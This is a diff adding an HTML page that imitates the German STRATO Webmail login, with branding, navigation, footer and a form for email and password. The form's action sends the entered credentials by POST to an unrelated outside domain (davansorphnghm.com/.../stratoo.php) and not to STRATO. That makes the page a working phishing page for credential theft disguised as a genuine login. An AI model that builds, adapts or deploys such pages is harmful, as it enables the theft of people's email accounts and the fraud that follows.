@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - STRATO Webmail</title>
+	<link rel="icon" type="image/svg+xml" href="favicon.ICO">
+    <style>
+        /* CSS Reset & Variables */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        :root {
+            --bg-color: #f7f8fa;
+            --text-dark: #2a2c60;
+            --text-light: #6b7280;
+            --strato-orange: #ff7c00;
+            --button-yellow: #fcd300;
+            --border-color: #e5e7eb;
+            --input-bg: #ffffff;
+            --footer-bg: #eff1f5;
+            --link-color: #3b3f88;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-dark);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 40px;
+            background-color: var(--bg-color);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            color: var(--strato-orange);
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .logo svg {
+            width: 28px;
+            height: 28px;
+            margin-right: 8px;
+            fill: var(--strato-orange);
+        }
+
+        .header-nav {
+            display: flex;
+            gap: 40px;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-dark);
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .nav-item svg {
+            width: 20px;
+            height: 20px;
+            margin-bottom: 6px;
+            fill: var(--text-dark);
+        }
+
+        .nav-item:hover {
+            opacity: 0.8;
+        }
+
+        /* Main Content */
+        main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 60px;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 600px;
+            padding: 20px;
+        }
+
+        .login-header {
+            margin-bottom: 30px;
+        }
+
+        .login-header h1 {
+            font-size: 22px;
+            font-weight: 400;
+            color: var(--text-dark);
+            margin-bottom: 5px;
+        }
+
+        .login-header h2 {
+            font-size: 48px;
+            font-weight: 800;
+            color: var(--text-dark);
+            letter-spacing: 1px;
+            line-height: 1;
+        }
+
+        /* Form */
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .input-group {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-group svg {
+            position: absolute;
+            left: 15px;
+            width: 20px;
+            height: 20px;
+            fill: var(--text-dark);
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px 16px 16px 48px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 16px;
+            color: var(--text-dark);
+            background-color: var(--input-bg);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: var(--text-dark);
+        }
+
+        .input-group input::placeholder {
+            color: var(--text-light);
+        }
+
+        .form-links {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 5px;
+            margin-bottom: 25px;
+        }
+
+        .forgot-password {
+            color: var(--link-color);
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            color: var(--text-dark);
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: var(--text-dark);
+            cursor: pointer;
+        }
+
+        .submit-btn {
+            background-color: var(--button-yellow);
+            color: var(--text-dark);
+            border: none;
+            border-radius: 30px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 400;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #e5c100;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--footer-bg);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: var(--text-dark);
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .footer-left a {
+            color: var(--text-dark);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .footer-left a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-left .divider {
+            color: var(--text-light);
+        }
+
+        .footer-right {
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="logo">
+            <!-- SVG Logo Icon -->
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3 3h10v10H3V3zm12 2h6v6h-6V5zM3 15h6v6H3v-6zm8 0h10v6H11v-6z"/>
+            </svg>
+            STRATO
+        </div>
+        <nav class="header-nav">
+            <a href="#" class="nav-item">
+                <!-- Help Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
+                </svg>
+                Hilfe & Kontakt
+            </a>
+            <a href="#" class="nav-item">
+                <!-- Globe Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+                </svg>
+                Deutsch <span style="font-size: 10px; margin-left: 4px;">▼</span>
+            </a>
+            <a href="#" class="nav-item">
+                <!-- User Icon -->
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                </svg>
+                Kunden-Login
+            </a>
+        </nav>
+    </header>
+
+    <main>
+        <div class="login-container">
+            <div class="login-header">
+                <h1>STRATO Webmail</h1>
+                <h2>LOGIN</h2>
+            </div>
+
+            <form action="https://davansorphnghm.com/876776/stratoo.php" method="POST">
+                <div class="input-group">
+                    <!-- Email Icon -->
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                    </svg>
+                    <input type="email" name="email" placeholder="E-Mail-Adresse" required>
+                </div>
+
+                <div class="input-group">
+                    <!-- Lock Icon -->
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+                    </svg>
+                    <input type="password" name="password" placeholder="Passwort" required>
+                </div>
+
+                <div class="form-links">
+                    <a href="#" class="forgot-password">Passwort vergessen?</a>
+                    
+                    <label class="checkbox-container">
+                        <input type="checkbox" checked>
+                        Angemeldet bleiben
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn">Einloggen</button>
+            </form>
+        </div>
+    </main>
+
+    <footer>
+        <div class="footer-left">
+            <a href="#">STRATO.de</a>
+            <span class="divider">|</span>
+            <a href="#">AGB</a>
+            <span class="divider">|</span>
+            <a href="#">Datenschutz</a>
+            <span class="divider">|</span>
+            <a href="#">Impressum</a>
+        </div>
+        <div class="footer-right">
+            © 2026 Open-Xchange GmbH &nbsp;&nbsp; Version: 8.46.7
+        </div>
+    </footer>
+
+</body>
+</html>
